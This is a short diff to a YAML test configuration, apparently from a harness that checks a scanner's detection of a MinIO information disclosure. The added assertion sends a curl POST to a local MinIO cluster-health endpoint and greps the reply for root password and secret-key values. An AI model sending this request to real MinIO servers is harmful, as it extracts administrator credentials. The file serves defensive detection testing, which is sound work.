@@ -17,6 +17,12 @@ ready:
   interval: 3s
 
 assertions:
+  - name: exploit-minio-env-leak
+    type: command
+    expect:
+      command: "curl -sf -X POST 'http://localhost:9272/minio/health/cluster?verify' | grep -qi 'MINIO_ROOT_PASSWORD\\|MINIO_SECRET_KEY\\|minioadmin'"
+      exit_code: 0
+
   - name: detects-minio-env-disclosure
     type: beacon
     target: minio:9000
